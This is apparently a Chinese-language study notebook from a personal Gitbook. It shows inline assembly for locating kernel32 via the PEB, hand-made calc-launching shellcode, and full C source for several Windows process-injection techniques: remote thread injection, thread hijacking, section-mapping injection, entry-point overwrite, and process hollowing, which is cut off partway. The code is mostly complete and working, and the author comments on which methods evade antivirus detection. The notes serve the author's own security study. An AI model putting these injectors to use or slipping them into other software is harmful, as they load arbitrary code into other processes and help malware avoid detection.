值得注意的是，rust语言被认为是一种高级语言，因为它提供了许多方便的高级功能，如泛型、模式匹配、闭包和枚举类型。同时提供了许多低级控制和系统级功能，如直接访问内存和线程、使用底层指针和原生数据类型等。 内联汇编 gcc/clang编译器 以下代码可以将eax的值赋值给变量LoadLibrary，但是下面的程序在第五行就会发生异常无法执行，原因是FS寄存器的检索失败导致的。 int LoadLibrary; printf(\"arch point########\"); __asm__( \"mov eax, fs:[0x30]\\n\" \"mov eax, [eax+0xc]\\n\" \"mov eax, [eax+0x14]\\n\" \"mov eax, [eax]\\n\" \"mov eax, [eax+0x10]\\n\" \"mov %0, eax\" // 通过这种方式利用\"=r\"的形式将eax的值赋给变量 :\"=r\"(LoadLibrary) ); printf(\"0x%08X\\n\", LoadLibrary); 不论是gcc还是clang编译器，在编译的时候使用参数-masm=intel可以允许intel语体的汇编通过编译。默认at&t语体 vs vs在编译的时候会有各种的优化和安全措施，在调试的时候比较困难，所以需要先关一下各种优化和安全检查. (5条消息) shellcode编写_天问_Herbert555的博客-CSDN博客_shellcode编写 主要区别是针对内联汇编的语法格式问题和最后的将值赋值给变量的问题。 测试shellcode - 32bit 这是用来被注入的进程 #include #include #include int GetKernel32BaseAddress() { int AddrOfKernel; __asm__( \"mov eax, fs:[0x30]\\n\" \"mov eax, [eax+0xc]\\n\" \"mov eax, [eax+0x18]\\n\" \"mov eax, [eax]\\n\" \"mov eax, [eax+0x8]\\n\" :\"=r\"(AddrOfKernel) ); return AddrOfKernel; } int main(char argc[], char argv) { char str[128]; // printf(\"Current proc id : %d\\n\", GetCurrentProcessId()); // get baseaddress of kernel32.dll printf(\"kernel32.dll : 0x%p\",GetKernel32BaseAddress()); // get LoadLibraryA() base address printf(\"loadlibraryA : 0x%p\\n\", LoadLibraryA); // get WinExec() base address printf(\"WinExec : 0x%p\\n\", WinExec); // get ExitProcess() base address printf(\"ExitProcess() : 0x%p\\n\", ExitProcess); printf(\"hello world\\n\"); printf(\"input something or waiting\\n\"); scanf(\"%s\", str); puts(str); return 0; } shellcode，调用winexec和exitprocess函数来弹出计算器。可以用来注入32位的进程，因为地址都是硬编码写死的，所以用的时候要注意注意。 unsigned char shellcode[] = \"\\x55\\x89\\xE5\\x33\\xC0\\x50\\xB8\\x2E\\x64\\x6C\\x6C\\x50\\xB8\\x65\\x6C\\x33\\x32\\x50\\xB8\\x6B\\x65\\x72\\x6E\\x50\\x8B\\xC4\\x50\\xB8\" \"\\xA0\\x12\\xed\\x76\" \"\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x2E\\x65\\x78\\x65\\x50\\xB8\\x63\\x61\\x6C\\x63\\x50\\x8B\\xC4\\x6A\\x05\\x50\\xB8\" \"\\xF0\\xE1\\xF0\\x76\" \"\\xFF\\xD0\\x33\\xC0\\x50\\xB8\" \"\\x80\\x59\\xed\\x76\" \"\\xFF\\xD0\\x90\\x90\\xC3\"; 64-bit shellcode-失败 \"\\x55\\x48\\x8B\\xEC\\x90\\xC7\\x04\\x24\\x2E\\x64\\x6C\\x6C\\xC7\\x44\\x24\\xFC\\x65\\x6C\\x33\\x32\\xC7\\x44\\x24\\xF8\\x6B\\x65\\x72\\x6E\\x48\\x8B\\xCC\\x90\\x90\\x48\\xB8\\xA0\\x8C\\xC7\\xA7\\xFE\\x7F\\x00\\x00\\xFF\\xD0\\xBA\\x05\\x00\\x00\\x00\\xC7\\x04\\x24\\x65\\x78\\x65\\x2E\\xC7\\x44\\x24\\xFC\\x63\\x6C\\x61\\x63\\xC7\\x44\\x24\\xF8\\x00\\x00\\x00\\x00\\x48\\x8B\\xCC\\x90\\x48\\xB8\\xD0\\x77\\x41\\xA8\\xFE\\x7F\\x00\\x00\\x90\\x90\\x90\\xC3\" donut 将exe转换为shellcode的一个工具(GitHub - TheWover/donut：生成 x86、x64 或 AMD64+x86 与位置无关的外壳代码，从内存加载 .NET 程序集、PE 文件和其他 Windows 有效负载，并使用参数运行它们) Nt和Rt开头的api 以 Nt 开头的函数是 Windows NT 内核提供的 Native API，是系统内部使用的函数。 以 Rt 开头的函数是通过封装 Nt 开头函数来实现的，提供给开发人员使用。 对于以 Nt 开头的函数，可能更难使用和访问，并且它们往往没有直接对应的文档说明，但它们通常具有更高的性能。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-18 20:15:57 "},"MyArticles/CyberSec/6种常见注入方式.html":{"url":"MyArticles/CyberSec/6种常见注入方式.html","title":"windows下的进程注入（6种）","keywords":"","body":"注入方式 根据各阶段调用的API，读写的内存位置的区别进行 如下分类（实战中常用的 6 种）： 1、远程线程注入 原始的注入手法。通过API申请空间，然后将code写入内存，然后创建线程执行。这种手法基本会被监控，但是报毒与否就再说了。 流程 打开进程 ---》申请空间 ---》写入shellcode ---》创建线程执行 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, wpid); LPVOID IpBaseAddress = VirtualAllocEx(hProcess, 0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //将shellcode写入内存 WriteProcessMemory(hProcess, IpBaseAddress, shellcode, sizeof(shellcode), NULL); //创建线程执行shellcode CreateRemoteThread(hProcess, 0, 100, (LPTHREAD_START_ROUTINE)IpBaseAddress, 0, 0, NULL); 实现代码 #include #include #include unsigned char shellcode[] = \"\\x55\\x89\\xE5\\x33\\xC0\\x50\\xB8\\x2E\\x64\\x6C\\x6C\\x50\\xB8\\x65\\x6C\\x33\\x32\\x50\\xB8\\x6B\\x65\\x72\\x6E\\x50\\x8B\\xC4\\x50\\xB8\\xA0\\x12\\x86\\x76\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x2E\\x65\\x78\\x65\\x50\\xB8\\x63\\x61\\x6C\\x63\\x50\\x8B\\xC4\\x6A\\x05\\x50\\xB8\\xF0\\xE1\\x89\\x76\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x80\\x59\\x86\\x76\\xFF\\xD0\\x90\\x90\\xC3\"; int main() { //计算器的进程号，准备注入他的进程 int wpid = 3632; //打开一个进程，后面指定PID HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, wpid); printf(\"%d\\n\", hProcess); //申请内存空间，最后赋予空间权限 LPVOID IpBaseAddress = VirtualAllocEx(hProcess, 0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); printf(\"IpBaseAddress : %p\\n\", IpBaseAddress); //将shellcode写入内存 WriteProcessMemory(hProcess, IpBaseAddress, shellcode, sizeof(shellcode), NULL); printf(\"WriteProcess\\n\"); //创建线程执行shellcode CreateRemoteThread(hProcess, 0, 100, (LPTHREAD_START_ROUTINE)IpBaseAddress, 0, 0, NULL); return 0; } 动态验证 VirtualAllocEx申请内存之后返回的地址，在内存中查看，可以看到一段全空空间。 在内存布局中查看，有一段ERW权限的申请出来的空间，大小是0x1000. 通过WriteProcessAddress函数将shellcode写进去，就可以在空间中看到写进去的code 但是这里通过内存查看，返现写进去的东西有点奇怪，和自己想的不一样。 因为\\\\x就不是16进制的数字了。而且\\xxx这个特殊的字符是不被允许的，找了好久才发现这个问题 这个 方式可以动态的调试shellcode 2、线程劫持注入 就是劫持一个线程进行注入，然后再恢复这个线程，就像是荆轲刺秦你迷晕了荆轲换了他的地图，再叫醒他去刺杀秦王一样，这个换了的地图就是shellcode。 流程 挂起目标线程，申请内存，写入shellcode，修改线程上下文使其指向shellcode，恢复线程执行shellcode 需要注意的是，这里需要先创建一个进程，而不是直接打开现存的进程。因为需要一个挂起状态 代码 #include #include void showstruct(PROCESS_INFORMATION pii) { printf(\"\\ndwProcessId: %d\\n\", pii.dwProcessId); printf(\"dwThreadId: %d\\n\", pii.dwThreadId); // Handle,也叫句柄，实际上是一个数据，是一个Long (整长型)的数据，是一种指向指针的指针。 printf(\"hProcess: 0x%p\\n\", pii.hProcess); printf(\"hThread: 0x%p\\n\", pii.hThread); printf(\"===============================================================================\\n\"); } int main() { // 定义两个进程相关的结构体变量，都是内置结构体，可以直接定义，然后初始化为0 STARTUPINFO si = { 0 }; PROCESS_INFORMATION pi = { 0 }; /* typedef struct _PROCESS_INFORMATION { HANDLE hProcess; HANDLE hThread; DWORD dwProcessId; DWORD dwThreadId; } PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION; */ // 创建一个名称为notepad。exe的进程，不用从父进程继承，创建之后状态为挂起，并且将信息赋值给si和pi if (!CreateProcess(NULL, \"notepad.exe\", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) { printf(\"Create process failed error code: %d\\n\", (int)GetLastError()); return 1; } // 根据进程id打开进程 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId); if (hProcess == NULL) { printf(\"Open process failed error code: %d\\n\", (int)GetLastError()); return 1; } // Shellcode，这里为了证明确实执行了，所以直接通过中断来验证 char shellcode[] = \"\\xcc\\xcc\\xB8\\x01\\x00\\x00\\x00\\xC3\"; // 利用api挂起进程 SuspendThread(pi.hThread); // 申请一个目标进程中的内存区域 LPVOID lpBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (lpBuffer == NULL) { printf(\"Virtual alloc failed error code ：%d\\n\", (int)GetLastError()); return 1; } // 显示出来申请区域的地址，方便调试的时候找 printf(\"shellcode address is : %p\\n\", lpBuffer); // 将shellcode写进去，和远程进程注入一样 if (!WriteProcessMemory(hProcess, lpBuffer, shellcode, sizeof(shellcode), NULL)) { printf(\"Write process memory failed error code：%d\\n\", (int)GetLastError()); return 1; } // 设置线程的上下文环境，让ip寄存器直接跳转 CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_ALL; if (!GetThreadContext(pi.hThread, &ctx)) { printf(\"GetThreadContext failed error code ：%d\\n\", (int)GetLastError()); return 1; } // 设置ip寄存器直接指向那块地址 ctx.Rip = (DWORD64)lpBuffer; // 设置保存线程环境 if (!SetThreadContext(pi.hThread, &ctx)) { printf(\"SetThreadContext failed error code ：%d\\n\", (int)GetLastError()); return 1; } // 恢复线程环境，这时就可以执行shellcode了 if (ResumeThread(pi.hThread) == -1) { printf(\"ResumeThread failed error code ：%d\\n\", (int)GetLastError()); return 1; } // 等待目标进程结束（这里可以直接从任务管理器关闭） WaitForSingleObject(pi.hProcess, INFINITE); // 清理恢复句柄释放空间 CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return 0; } 经过验证发现是成功的，可以执行到shellcode的位置。但是缺点就是执行会创建一个新的线程，虽然在挂起的状态下前端不会有什么显示，但是还是不巧妙。 以上的方法属于是同一类，仅仅是执行的方式不同，下面通过更换申请内存的方式来进行注入。 3、映射注入 就是通过在内存中申请一块公共内存，然后将这块内存映射到注入程序和被注入程序，这样需要修改shellcode的时候仅需要在注入程序中修改，就可以同时映射到被注入内存中。 这种注入方式规避了VirtualAllocEx和WriteProcessMemory这些写内存的敏感函数的检测，所以该方法一般被用来当作是一种写shellcode的方式，和其他的执行方式相结合 但是在分享的时候没有给出具体的代码，只给出了零碎的一些片段 // 创建一个内存区域，并且读写执行权限 NtCreateSection(&sectionHandle, SECTION_MAP_READ|SECTION_MAP_WRITE|SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL); // 将这块内存区域映射到注入进程中 NtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE); // 将shellcode复制到内存区域 memcpy(localSectionAddress, shellcode, sizeof(shellcode)); // 创建远程线程执行 RtCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL); NtCreateSection NtCreateSection( &sectionHandle, // 接收节对象的句柄的 HANDLE 变量的指针 SECTION_MAP_READ|SECTION_MAP_WRITE|SECTION_MAP_EXECUTE, // 确定对对象的请求访问权限 NULL, // 不使用文件映像，而是创建一个空的内存区域。 (PLARGE_INTEGER)&sectionSize, // 指定节的最大大小（以字节为单位） PAGE_EXECUTE_READWRITE, // 指定要在节中的每个页面上放置的保护 SEC_COMMIT, // 分配属性的 SEC_XXX 标志的位掩码 NULL); // 不适用额外的文件句柄。 NtMapViewOfSection 这是一个未公开的api函数，这个函数在用户态下执行，而且不会被判断异常 NtMapViewOfSection( sectionHandle, // 要映射的内存区域的句柄。 GetCurrentProcess(), // 指定要映射到内存的句柄（这里就是自己的线程） &localSectionAddress, // 用于接收映射到当前进程中的内存区域的起始地址。 NULL, // 不指定映射到当前进程中的起始地址 NULL, // 不指定映射到当前进程中的内存区域的大小 NULL, // 不指定内存区域的偏移量。 &size, // 用于接收内存区域的大小。 2, // 指定内存区域的类型，2 表示映射到当前进程的内存地址空间。 NULL, // 表示不指定任何额外的信息 PAGE_READWRITE); // 内存页的保护模式，表示该内存页可读、可写。 这个函数的定义来自chatgpt，很佩服啊 RtlCreateUserThread 这个函数需要引用ntdll.lib，但是仅限于x64的程序 RtCreateUserThread( targetHandle, // 指定要注入的进程的句柄 NULL, // 不指定线程的安全标志 FALSE, // 指定线程是否独占，FALSE 表示不独占 0, // 线程栈的大小，0表示默认的大小 0, // 线程的优先级，0表示默认 0, // 线程的初始挂起状态，0 表示线程在创建后立即开始执行 remoteSectionAddress, // 指定要执行的 shellcode 的起始地址，该地址在注入进程中 NULL, // 表示不指定线程的线程函数的参数 &targetThreadHandle, // 用于接收新创建的线程的句柄 NULL); // 表示不接收线程的创建时间 测试的shellcode，还是弹出一个计算器的功能，仅限于32位的程序 unsigned char shellcode[] = \"\\x55\\x89\\xE5\\x33\\xC0\\x50\\xB8\\x2E\\x64\\x6C\\x6C\\x50\\xB8\\x65\\x6C\\x33\\x32\\x50\\xB8\\x6B\\x65\\x72\\x6E\\x50\\x8B\\xC4\\x50\\xB8\\xA0\\x12\\xC4\\x76\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x2E\\x65\\x78\\x65\\x50\\xB8\\x63\\x61\\x6C\\x63\\x50\\x8B\\xC4\\x6A\\x05\\x50\\xB8\\xF0\\xE1\\xC7\\x76\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x80\\x59\\xC4\\x76\\xFF\\xD0\\x90\\x90\\xC3\"; 代码实现 参考：https://idiotc4t.com/code-and-dll-process-injection/mapping-injection #include #include #pragma comment(lib, \"ntdll.lib\") #pragma comment (lib, \"OneCore.lib\") unsigned char shellcode[] = \"\\x55\\x89\\xE5\\x33\\xC0\\x50\\xB8\\x2E\\x64\\x6C\\x6C\\x50\\xB8\\x65\\x6C\\x33\\x32\\x50\\xB8\\x6B\\x65\\x72\\x6E\\x50\\x8B\\xC4\\x50\\xB8\\xA0\\x12\\xC4\\x76\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x2E\\x65\\x78\\x65\\x50\\xB8\\x63\\x61\\x6C\\x63\\x50\\x8B\\xC4\\x6A\\x05\\x50\\xB8\\xF0\\xE1\\xC7\\x76\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x80\\x59\\xC4\\x76\\xFF\\xD0\\x90\\x90\\xC3\"; int main() { HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(shellcode), NULL); if (hMapping == 0) return 0; LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, sizeof(shellcode)); if (lpMapAddress == 0) return 0; memcpy((PVOID)lpMapAddress, shellcode, sizeof(shellcode)); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 22508); // 打开句柄为25032的进程，并返回句柄。PROCESS_ALL_ACCESS表示需要完全访问权限。 LPVOID lpMapAddressRemote = MapViewOfFile2(hMapping, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READ); // 将映射对象映射到句柄为hProcess的进程的地址空间，以便在该进程中执行代码。PAGE_EXECUTE_READ表示需要执行和读取权限。 HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, NULL, 0, NULL); /*下面的代码仅适合于64位的程序 HANDLE hThread = NULL; LPVOID lpParameter = NULL; RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, lpMapAddress, lpParameter, &hThread, NULL); */ UnmapViewOfFile(lpMapAddress); CloseHandle(hMapping); return 0; } 4、覆盖入口点注入 在创建进程的时候，直接将进程的入口点的代码更改为shellcode，最后恢复挂起的主线程；缺点是为了达到线程开始挂起的状态，只能通过创建的方式进行，不能通过打开现有进程的方式执行。 流程 创建进程后挂起进程，通过PE文件结构找到入口点，将shellcode直接写入进程的入口点，然后恢复线程。 整个流程类似于线程劫持注入的过程，只不过这里是直接覆盖了入口点的代码。 关键函数：函数具体参考定义) __kernel_entry NTSTATUS NtQueryInformationProcess( [in] HANDLE ProcessHandle, //要检索其信息的进程的句柄。 [in] PROCESSINFOCLASS ProcessInformationClass, [out] PVOID ProcessInformation, [in] ULONG ProcessInformationLength, [out, optional] PULONG ReturnLength ); [in] ProcessInformationClass 要检索的进程信息的类型。 此参数可以是 PROCESSINFOCLASS 枚举中的以下值之一。 Value 含义 ProcessBasicInformation0 检索指向 PEB 结构的指针，该结构可用于确定是否正在调试指定的进程，以及系统用于标识指定进程的唯一值。使用 CheckRemoteDebuggerPresent 和 GetProcessId 函数获取此信息。 ProcessDebugPort7 检索一个 DWORD_PTR 值，该值是进程的调试器的端口号。 非零值指示进程在环 3 调试器的控制下运行。使用 CheckRemoteDebuggerPresent 或 IsDebuggerPresent 函数。 ProcessWow64Information26 确定进程是否在 WOW64 环境中运行， (WOW64 是 x86 模拟器，它允许基于 Win32 的应用程序在 64 位 Windows) 上运行。使用 IsWow64Process2 函数获取此信息。 ProcessImageFileName27 检索包含进程映像文件名称的 UNICODE_STRING 值。使用 QueryFullProcessImageName 或 GetProcessImageFileName 函数获取此信息。 ProcessBreakOnTermination29 检索一个 ULONG 值，该值指示进程是否被视为关键。注意 此值可以在 Windows XP 和 SP3 中使用。 从 Windows 8.1 开始，应改用 IsProcessCritical。 ProcessSubsystemInformation75 检索指示进程的子系统类型的 SUBSYSTEM_INFORMATION_TYPE 值。 ProcessInformation 参数指向的缓冲区应足够大，可以容纳单个SUBSYSTEM_INFORMATION_TYPE枚举。 找到入口点 利用PEB结构找到里面的PebBaseAddress项，定位到内存中的pe文件的头，就是MZ的位置。然后通过DOS头里的e_lfanew项的值，定位到NT头就是PE的位置，然后找到可选头，直接获得里面的程序入口点+imageBase 写入代码 通过WriteProcessMemory直接把shellcode写入上述计算出来的函数的入口点的地址指向的地方。 执行 通过ResumeThread函数直接执行，或者利用CreateRemoteThread函数来执行 实现代码 #include #include #include // 32bit unsigned char shellcode[] = \"\\xcc\\xc3\\x55\\x89\\xE5\\x33\\xC0\\x50\\xB8\\x2E\\x64\\x6C\\x6C\\x50\\xB8\\x65\\x6C\\x33\\x32\\x50\\xB8\\x6B\\x65\\x72\\x6E\\x50\\x8B\\xC4\\x50\\xB8\" \"\\xA0\\x12\\xed\\x76\" \"\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x2E\\x65\\x78\\x65\\x50\\xB8\\x63\\x61\\x6C\\x63\\x50\\x8B\\xC4\\x6A\\x05\\x50\\xB8\" \"\\xF0\\xE1\\xF0\\x76\" \"\\xFF\\xD0\\x33\\xC0\\x50\\xB8\" \"\\x80\\x59\\xed\\x76\" \"\\xFF\\xD0\\x90\\x90\\xC3\"; // 64bit unsigned char shellcode64[] = \"\\xcc\\xc3\\x55\\x48\\x8B\\xEC\\x90\\xC7\\x04\\x24\\x2E\\x64\\x6C\\x6C\\xC7\\x44\\x24\\xFC\\x65\\x6C\\x33\\x32\\xC7\\x44\\x24\\xF8\\x6B\\x65\\x72\\x6E\\x48\\x8B\\xCC\\x90\\x90\\x48\\xB8\" \"\\xA0\\x8C\\xC7\\xA7\\xFE\\x7F\\x00\\x00\" \"\\xFF\\xD0\\xBA\\x05\\x00\\x00\\x00\\xC7\\x04\\x24\\x65\\x78\\x65\\x2E\\xC7\\x44\\x24\\xFC\\x63\\x6C\\x61\\x63\\xC7\\x44\\x24\\xF8\\x00\\x00\\x00\\x00\\x48\\x8B\\xCC\\x90\\x48\\xB8\" \"\\xD0\\x77\\x41\\xA8\\xFE\\x7F\\x00\\x00\" \"\\x90\\x90\\x90\\xC3\"; typedef struct _PROCESS_BASIC_INFORMATION { PVOID Reserved1; PVOID PebBaseAddress; PVOID Reserved2[2]; ULONG_PTR UniqueProcessId; PVOID Reserved3; } PROCESS_BASIC_INFORMATION; typedef LONG(NTAPI* NtQueryInformationProcessPtr)( HANDLE ProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength ); int main() { // NtQueryInformationProcess api在ntdll里，属于未公开的函数，所以需要动态调用 HMODULE hNtdll = LoadLibraryA(\"ntdll.dll\"); if (hNtdll == NULL) { printf(\"无法加载 ntdll.dll 库\\n\"); return 1; } // 设置启动信息和进程信息，保留在结构体里，方便后续操作 STARTUPINFO si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 }; // 因为需要一个挂起状态的进程，所以需要Create，而不能Open，而且需要执行入口点，所以只能创建 if (!CreateProcessA(NULL, (LPSTR)\"C:\\\\Windows\\\\System32\\\\svchost.exe\", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) { printf(\"CreateProcessA 失败，错误码 %lu\\n\", GetLastError()); return 1; } NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hNtdll, \"NtQueryInformationProcess\"); //find base addr by peb PROCESS_BASIC_INFORMATION pbi; ULONG ReturnLength; NTSTATUS status = NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), &ReturnLength); if (status != 0) { printf(\"NtQueryInformationProcess 失败，错误码 %lu\\n\", status); return 1; } // peb offset DWORD_PTR pef_offset = (DWORD_PTR)pbi.PebBaseAddress + 0x10; LPVOID imagebase_addr = 0; if (!ReadProcessMemory(pi.hProcess, (LPVOID)pef_offset, &imagebase_addr, sizeof(LPVOID), NULL)) { printf(\"读取目标进程的Peb结构体失败，错误码 %lu\\n\", GetLastError()); return 1; } // MZ address printf(\"imagebase_addr: 0x%p\", imagebase_addr); //（EntryPoint） // dos header IMAGE_DOS_HEADER dosHeader = { 0 }; if (!ReadProcessMemory(pi.hProcess, imagebase_addr, &dosHeader, sizeof(dosHeader), NULL)) { printf(\"读取目标进程的DOS头失败，错误码 %lu\\n\", GetLastError()); return 1; } // nt header // 这里需要定义一个结构体，用PIMAGE_NT_HEADERS定义的话默认定义了一个类型的指针但是并没有开辟内存空间，所以会报错 IMAGE_NT_HEADERS ntHeader = { 0 }; DWORD nt_offset = dosHeader.e_lfanew; // 定位到nt头的位置 if (!ReadProcessMemory(pi.hProcess, (LPVOID)((DWORD_PTR)imagebase_addr + nt_offset), &ntHeader, sizeof(ntHeader), NULL)) { printf(\"读取目标进程的NT头失败，错误码 %lu\\n\", GetLastError()); return 1; } // 找到可选头里的入口偏移，然后算EntryPoint的真实地址 LPVOID entry_point = (LPVOID)(ntHeader.OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)imagebase_addr); // 将入口点的代码覆盖掉 if (!WriteProcessMemory(pi.hProcess, entry_point, shellcode64, sizeof(shellcode64), NULL)) { printf(\"修改进程入口点代码失败，错误码 %lu\\n\", GetLastError()); } // 恢复主线程执行 ResumeThread(pi.hThread); WaitForSingleObject(pi.hProcess, INFINITE); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return 0; } 5、傀儡进程 根据统计这是比较经典的进程注入的方式，所以被很多的恶意软件和APT组织所使用，所以导致目前主流的杀毒软件和沙箱都对他有很完善的检查策略，所以基本没有什么实际的用处了。 流程 创建一个挂起的进程，然后将该进程的内存映射取消掉，换成shellcode或者payload这些代码，然后再恢复进程运行状态 挂起进程 通过创建的方式创建一个挂起状态的进程，和之前的几个一个套路 取消映射 利用 NtUnmapViewOfSection来取消原来的映射，并利用VirtualAllocEx函数申请内存区域。 重新申请 利用VirtualAllocEx重新申请一块空间，然后把准备好的东西写进去 设置PEB 重新写PEB里的base address【64->RDX】并设置好RCX寄存器（64位） 恢复执行 直接resume就行了（不要注入svchost） 实现代码 #include #include #include typedef LONG(NTAPI* NtUnMapViewOfSectionPtr)(HANDLE hProcess, PVOID BaseAddress); typedef struct _PROCESS_BASIC_INFORMATION { PVOID Reserved1; PVOID PebBaseAddress; PVOID Reserved2[2]; ULONG_PTR UniqueProcessId; PVOID Reserved3; } PROCESS_BASIC_INFORMATION; typedef LONG(NTAPI* NtQueryInformationProcessPtr)( HANDLE ProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength ); int main(int argc, char* argv[]) { // 准备要往里面替换的进程,一定要使用完整目录 LPCSTR file_path = \"E:\\\\信息安全知识学习\\\\ProcessThread注入\\\\进程注入学习代码\\\\傀儡进程注入\\\\x64\\\\Debug\\\\injected.exe\"; HANDLE hFile = CreateFileA(file_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { printf(\"Open EXE File Failed error code: %d\", GetLastError()); return 1; } DWORD dwFileSize = GetFileSize(hFile, NULL); PBYTE pBuf = (PBYTE)malloc(dwFileSize); DWORD dwBytesRead = 0; if (!ReadFile(hFile, pBuf, dwFileSize, &dwBytesRead, NULL)) { printf(\"ReadFile Failed error code: %d\", GetLastError()); CloseHandle(hFile); free(pBuf); return 1; } // 得到主要运行内容的dos和nt头 PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuf; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pBuf + pDosHeader->e_lfanew); //2.获取进程上下文 ： 第一步：创建傀儡进程外壳，设置挂起状态，保存上下文信息 STARTUPINFO si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 }; if (!CreateProcessA(NULL, (LPSTR)\"E:\\\\信息安全知识学习\\\\ProcessThread注入\\\\进程注入学习代码\\\\傀儡进程注入\\\\x64\\\\father.exe\", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) { printf(\"CreateProcessA 失败，错误码 %lu\\n\", GetLastError()); return 1; } CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL; if (GetThreadContext(pi.hThread, &ctx) == 0) { printf(\"CreateProcess failed %d\\n\", GetLastError()); return 1; } //3.清空目标进程 ： 第二步：取消原先的进程的内存 HMODULE hNtdll = LoadLibraryA(\"ntdll.dll\"); if (hNtdll == NULL) { printf(\"无法加载 ntdll.dll 库\\n\"); return 1; } NtUnMapViewOfSectionPtr NtUnMapViewOfSection = (NtUnMapViewOfSectionPtr)GetProcAddress(hNtdll, \"NtUnmapViewOfSection\"); LPVOID dwProcessBaseAddr = 0; // 获取目标进程的base address， 然后将他的内存取消注册 // context.Ecx = 基地址的地址，因此从context.Ebx + 8的地址读取4字节的内容并转化为DWORD类型，既是进程加载的基地址 if (!ReadProcessMemory(pi.hProcess, (LPCVOID)ctx.Rcx, &dwProcessBaseAddr, sizeof(PVOID), NULL)) { printf(\"ReadProcessMemory failed %lu\\n\", GetLastError()); return 1; } // 通过x64dbg看到确实可以 NtUnMapViewOfSection(pi.hProcess, (LPCVOID)ctx.Rcx); //4.重新分配空间 LPVOID lpAddr = VirtualAllocEx(pi.hProcess, (LPVOID)pNtHeaders->OptionalHeader.ImageBase, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);//用Imagebase为起始地址避免了重定位。 if (lpAddr == NULL) { printf(\"VirtualAlloc failed %d\\n\", GetLastError()); return 1; } //5.写入傀儡进程 // 替换PE头 // 这里在内存中开辟的40000的空间写入了被注入程序的所有的头，节区留着后面写 if (!WriteProcessMemory(pi.hProcess, lpAddr, (LPCVOID)pBuf, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL)) { printf(\"WriteProcessMemory error code : %d\\n\", GetLastError()); return 1; } // 替换节 // 将地址seek到节区头开始 DWORD nt_size = sizeof(IMAGE_NT_HEADERS); long long tmp = (pBuf + pDosHeader->e_lfanew); LPVOID lpSectionBaseAddr = (LPVOID)(tmp + nt_size); PIMAGE_SECTION_HEADER pSectionHeader; for (DWORD dwIndex = 0; dwIndex FileHeader.NumberOfSections; ++dwIndex) { pSectionHeader = (PIMAGE_SECTION_HEADER)lpSectionBaseAddr; // 句柄，要写入进程的地址，指向本程序的要往外写的内容的地址 LPVOID RemoteProcess_address = (LPVOID)((BYTE*)lpAddr + pSectionHeader->VirtualAddress); LPVOID LocalProcess_address = (LPCVOID)(pBuf + pSectionHeader->PointerToRawData); if (!WriteProcessMemory(pi.hProcess, RemoteProcess_address, LocalProcess_address, pSectionHeader->SizeOfRawData, NULL)) { printf(\"WriteProcessMemory error code : %d\\n\", GetLastError()); return 1; } lpSectionBaseAddr = (LPVOID)((BYTE*)lpSectionBaseAddr + sizeof(IMAGE_SECTION_HEADER)); } //6.恢复现场并运行傀儡进程 // 替换PEB中基地址 DWORD dwImageBase = pNtHeaders->OptionalHeader.ImageBase; // 另一种修改peb的方式 /* NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hNtdll, \"NtQueryInformationProcess\"); //find base addr by peb PROCESS_BASIC_INFORMATION pbi; ULONG ReturnLength; NTSTATUS status = 